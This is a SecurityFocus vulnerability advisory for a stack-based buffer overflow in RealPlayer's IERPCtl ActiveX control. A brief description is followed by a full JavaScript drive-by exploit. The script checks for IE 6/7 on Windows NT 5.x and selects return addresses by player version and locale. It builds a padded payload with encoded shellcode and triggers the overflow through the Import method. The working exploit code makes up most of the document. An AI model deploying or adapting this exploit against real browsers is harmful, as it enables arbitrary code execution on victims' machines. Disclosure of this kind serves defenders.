source: http://www.securityfocus.com/bid/26130/info

RealPlayer is prone to a stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks of user-supplied input before copying it to an insufficiently sized memory buffer.

Attackers can exploit this issue to execute arbitrary code in the context of the application using the affected control (typically Internet Explorer). Successful attacks can compromise the application and possibly the underlying computer. Failed attacks will likely cause denial-of-service conditions. 

<script language="javascript">

eval("function RealExploit()

{

var user = navigator.userAgent.toLowerCase();

if(user.indexOf("msie 6")==-1&&user.indexOf("msie 7")==-1)

  return;

if(user.indexOf("nt 5.")==-1)

  return;

VulObject = "IER" + "PCtl.I" + "ERP" + "Ctl.1";

try

{

  Real = new ActiveXObject(VulObject);

}catch(error)

{

  return;

}

RealVersion = Real.PlayerProperty("PRODUCTVERSION");

Padding = "";

JmpOver = unescape("%75%06%74%04");

for(i=0;i<32*148;i++)

  Padding += "S";

 

 

if(RealVersion.indexOf("6.0.14.") == -1)

{

  if(navigator.userLanguage.toLowerCase() == "zh-cn")

   ret = unescape("%7f%a5%60");

  else if(navigator.userLanguage.toLowerCase() == "en-us")

   ret = unescape("%4f%71%a4%60");

  else

   return;

}

else if(RealVersion == "6.0.14.544")

  ret = unescape("%63%11%08%60");

else if(RealVersion == "6.0.14.550")

  ret = unescape("%63%11%04%60");

else if(RealVersion == "6.0.14.552")

  ret = unescape("%79%31%01%60");

else if(RealVersion == "6.0.14.543")

  ret = unescape("%79%31%09%60");

else if(RealVersion == "6.0.14.536")

  ret = unescape("%51%11%70%63");

else

  return;

 

 

 

if(RealVersion.indexOf("6.0.10.") != -1)

{

  for(i=0;i<4;i++)

   Padding = Padding + JmpOver;

  Padding = Padding + ret;

}

else if(RealVersion.indexOf("6.0.11.") != -1)

{

  for(i=0;i<6;i++)

   Padding = Padding + JmpOver;

  Padding = Padding + ret;

}

else if(RealVersion.indexOf("6.0.12.") != -1)

{

  for(i=0;i<9;i++)

   Padding = Padding + JmpOver;

  Padding = Padding + ret;

}

else if(RealVersion.indexOf("6.0.14.") != -1)

{

  for(i=0;i<10;i++)

   Padding = Padding + JmpOver;

   Padding = Padding + ret;

}

 

AdjESP = "LLLL\\XXXXXLD";

Shell = "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIJKBtnkSEgLnkD4vUT8fczUpVLKQfa04CHuFSJiCyqQnMFSIKtvvomnVtFHfXYbbTTHYQzkTMgsxZ3pjKHoUkyO1eJGqNlKsnQ4S3YMRFnkDL2knkQNELeSIMNkGtlKFckukspuSB2LrMrOpnTnE4RLRLS01S7JclRuVNSUt8PegpEcIPU4vcQPP0ahTLnkaP4LNkppwlNMLKSps8JKS9lKCpUdLMcpcLNkaPWLJ5OOLNbn4NjLzHNdKOyokOmS8ls4K3dltd7LIoN0lUv0MoTv4ZdoBPhhROkOKOYoLKSdWTkLLMSbNZVSYKrsbs3bzKfD0SKOjp1MOONxKNozTNm8scioKOkONcJLUTK3VLQ4qrKOxPMosNkhm2qcHhspKOkO9obrkOXPkXKg9oKO9osXsDT4pp4zvODoE4ea6NPlrLQcu71yrNcWTne3poPmTo2DDqFOprrLDnpecHQuWp";

PayLoad = Padding + AdjESP + Shell;

while(PayLoad.length < 0x8000)

  PayLoad += "YuanGe"; // ?~??~-.=!

Real.Import("c:\\Program Files\\NetMeeting\\TestSnd.wav", PayLoad,"", 0, 0);

}

RealExploit();")

</script>